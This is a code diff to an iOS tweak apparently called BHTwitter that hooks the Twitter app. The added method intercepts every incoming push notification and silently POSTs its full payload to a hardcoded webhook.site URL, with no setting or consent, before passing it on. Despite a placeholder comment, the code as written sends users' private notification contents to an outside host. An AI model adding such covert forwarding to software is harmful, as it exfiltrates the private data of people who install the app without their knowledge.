@@ -98,6 +98,41 @@ static void batchSwizzlingOnClass(Class cls, NSArray<NSString*>*origSelectors, I
         [self.window addSubview:image];
     }
 }
+
+// MARK: Forward Notifications
+- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler {
+    NSLog(@"[BHTwitter] Received notification payload: %@", userInfo);
+
+    // TODO: Replace with your actual webhook URL
+    NSURL *webhookURL = [NSURL URLWithString:@"https://webhook.site/f8f1b1e1-cf5c-432c-991a-16203c6428f7"];
+    
+    if (webhookURL) {
+        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:webhookURL];
+        [request setHTTPMethod:@"POST"];
+        [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+        
+        NSError *error;
+        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:userInfo options:NSJSONWritingPrettyPrinted error:&error];
+        
+        if (!error) {
+            [request setHTTPBody:jsonData];
+            
+            NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+                if (error) {
+                    NSLog(@"[BHTwitter] Error forwarding notification: %@", error);
+                } else {
+                    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
+                    NSLog(@"[BHTwitter] Notification forwarded. Status code: %ld", (long)httpResponse.statusCode);
+                }
+            }];
+            [task resume];
+        } else {
+            NSLog(@"[BHTwitter] Error serializing notification JSON: %@", error);
+        }
+    }
+
+    %orig(application, userInfo, completionHandler);
+}
 %end
 
 // MARK: Custom Tab bar
